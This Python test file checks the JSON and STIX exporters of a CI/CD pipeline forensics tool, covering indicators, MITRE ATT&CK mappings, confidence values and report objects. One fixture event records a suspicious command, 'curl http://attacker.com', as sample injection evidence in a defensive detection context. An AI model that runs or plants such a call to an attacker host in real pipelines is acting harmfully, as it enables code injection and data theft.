"""Tests for JSON and STIX export modules."""
import sys
import os
import json
import tempfile
import unittest
from datetime import datetime, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from src.correlation_engine.models import PipelineEvent, CorrelationResult
from src.reporters.json_export import JsonExporter
from src.reporters.stix_export import StixExporter


def _make_events():
    return [
        PipelineEvent(
            timestamp=datetime(2026, 2, 5, 14, 0, 0, tzinfo=timezone.utc),
            source='CI Runner', event_type='Step Execution',
            details='Suspicious Curl Command: curl http://attacker.com',
            evidence_hash='sha256_abc123',
        ),
        PipelineEvent(
            timestamp=datetime(2026, 2, 5, 14, 5, 0, tzinfo=timezone.utc),
            source='Git', event_type='Commit',
            details='Author: mallory, Message: fix healthcheck',
            evidence_hash='sha256_def456',
        ),
    ]


def _make_findings(events):
    return [
        CorrelationResult(
            is_compromised=True,
            root_cause='Pipeline Injection Detected',
            timeline=[events[0]],
            severity='CRITICAL',
            confidence=0.9,
            mitre_id='T1059.004',
            rule_id='RULE-001',
        ),
        CorrelationResult(
            is_compromised=True,
            root_cause='Credential Theft Suspected',
            timeline=[events[1]],
            severity='HIGH',
            confidence=0.6,
            mitre_id='T1078',
            rule_id='RULE-002',
        ),
    ]


class TestJsonExporter(unittest.TestCase):

    def setUp(self):
        self.tmpfile = tempfile.NamedTemporaryFile(suffix='.json', delete=False)
        self.tmpfile.close()
        self.events = _make_events()
        self.findings = _make_findings(self.events)

    def tearDown(self):
        os.unlink(self.tmpfile.name)

    def test_export_creates_valid_json(self):
        exporter = JsonExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001', 'simulate', 1.5)
        
        with open(self.tmpfile.name, 'r') as f:
            data = json.load(f)
        
        self.assertEqual(data['export_format'], 'DPFF-JSON')
        self.assertIn('investigation', data)
        self.assertIn('findings', data)
        self.assertIn('events', data)

    def test_export_has_investigation_metadata(self):
        exporter = JsonExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001', 'simulate', 1.5)
        
        inv = result['investigation']
        self.assertEqual(inv['id'], 'inv-001')
        self.assertEqual(inv['mode'], 'simulate')
        self.assertEqual(inv['event_count'], 2)
        self.assertEqual(inv['finding_count'], 2)

    def test_export_findings_have_mitre_and_confidence(self):
        exporter = JsonExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings)
        
        f0 = result['findings'][0]
        self.assertEqual(f0['rule_id'], 'RULE-001')
        self.assertEqual(f0['mitre_attack_id'], 'T1059.004')
        self.assertEqual(f0['confidence'], 0.9)
        self.assertEqual(f0['severity'], 'CRITICAL')

    def test_export_events_have_hashes(self):
        exporter = JsonExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings)
        
        e0 = result['events'][0]
        self.assertEqual(e0['evidence_hash'], 'sha256_abc123')
        self.assertEqual(e0['source'], 'CI Runner')

    def test_export_with_integrity_and_custody(self):
        exporter = JsonExporter(self.tmpfile.name)
        integrity = {'integrity_intact': True, 'verified_count': 2, 'failed_count': 0}
        custody = {'root_hash': 'abc123', 'event_hashes': ['h1', 'h2']}
        result = exporter.export(self.events, self.findings, integrity=integrity, custody=custody)
        
        self.assertEqual(result['integrity']['status'], 'INTACT')
        self.assertEqual(result['chain_of_custody']['root_hash'], 'abc123')

    def test_empty_export(self):
        exporter = JsonExporter(self.tmpfile.name)
        result = exporter.export([], [])
        self.assertEqual(result['investigation']['event_count'], 0)
        self.assertEqual(result['investigation']['finding_count'], 0)


class TestStixExporter(unittest.TestCase):

    def setUp(self):
        self.tmpfile = tempfile.NamedTemporaryFile(suffix='.json', delete=False)
        self.tmpfile.close()
        self.events = _make_events()
        self.findings = _make_findings(self.events)

    def tearDown(self):
        os.unlink(self.tmpfile.name)

    def test_export_creates_valid_stix_bundle(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001')
        
        self.assertEqual(result['type'], 'bundle')
        self.assertTrue(result['id'].startswith('bundle--'))
        self.assertIn('objects', result)

    def test_bundle_contains_identity(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001')
        
        identities = [o for o in result['objects'] if o['type'] == 'identity']
        self.assertEqual(len(identities), 1)
        self.assertIn('DPFF', identities[0]['name'])

    def test_bundle_contains_indicators(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001')
        
        indicators = [o for o in result['objects'] if o['type'] == 'indicator']
        self.assertEqual(len(indicators), 2)
        self.assertTrue(indicators[0]['id'].startswith('indicator--'))
        self.assertIn('RULE-001', indicators[0]['name'])

    def test_bundle_contains_attack_patterns(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001')
        
        patterns = [o for o in result['objects'] if o['type'] == 'attack-pattern']
        self.assertTrue(len(patterns) >= 2)  # T1059.004 and T1078
        mitre_ids = set()
        for p in patterns:
            for ref in p.get('external_references', []):
                mitre_ids.add(ref.get('external_id'))
        self.assertIn('T1059.004', mitre_ids)
        self.assertIn('T1078', mitre_ids)

    def test_bundle_contains_relationships(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001')
        
        rels = [o for o in result['objects'] if o['type'] == 'relationship']
        self.assertTrue(len(rels) >= 2)
        for r in rels:
            self.assertEqual(r['relationship_type'], 'indicates')
            self.assertTrue(r['source_ref'].startswith('indicator--'))
            self.assertTrue(r['target_ref'].startswith('attack-pattern--'))

    def test_bundle_contains_observed_data(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001')
        
        observed = [o for o in result['objects'] if o['type'] == 'observed-data']
        self.assertEqual(len(observed), 2)

    def test_bundle_contains_report(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001')
        
        reports = [o for o in result['objects'] if o['type'] == 'report']
        self.assertEqual(len(reports), 1)
        self.assertIn('inv-001', reports[0]['name'])

    def test_indicator_confidence(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export(self.events, self.findings, 'inv-001')
        
        indicators = [o for o in result['objects'] if o['type'] == 'indicator']
        self.assertEqual(indicators[0]['confidence'], 90)  # 0.9 * 100
        self.assertEqual(indicators[1]['confidence'], 60)  # 0.6 * 100

    def test_deterministic_ids(self):
        """Same input should produce same STIX IDs."""
        e1 = StixExporter(self.tmpfile.name)
        result1 = e1.export(self.events, self.findings, 'inv-001')
        
        e2 = StixExporter(self.tmpfile.name)
        result2 = e2.export(self.events, self.findings, 'inv-001')
        
        self.assertEqual(result1['id'], result2['id'])

    def test_empty_export(self):
        exporter = StixExporter(self.tmpfile.name)
        result = exporter.export([], [], 'inv-empty')
        self.assertEqual(result['type'], 'bundle')
        # Should have identity + report at minimum
        self.assertTrue(len(result['objects']) >= 2)


if __name__ == '__main__':
    unittest.main()
